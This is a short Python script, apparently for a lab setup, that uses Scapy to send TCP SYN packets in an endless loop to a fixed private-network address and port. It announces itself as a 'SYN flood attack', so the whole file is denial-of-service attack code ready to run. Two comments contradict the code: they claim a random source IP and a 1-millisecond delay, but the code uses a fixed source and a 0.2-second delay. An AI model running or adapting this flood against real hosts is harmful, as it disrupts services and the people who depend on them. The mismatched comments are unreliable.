from scapy.all import IP, TCP, send
import time

# Configuration
target_ip = "192.168.204.117"  # Server machine IP address
target_port = 9999         # Port to attack

# Attack rate
delay = 0.2  # 1 millisecond delay between packets

print(f"Starting SYN flood attack on {target_ip}:{target_port}")

try:
    while True:
        # Craft a SYN packet with a random source IP
        packet = IP(src="192.168.204.13", dst=target_ip) / TCP(dport=target_port, flags="S")
        send(packet, verbose=False)
        time.sleep(delay)  # Control attack rate
except KeyboardInterrupt:
    print("Attack stopped.")
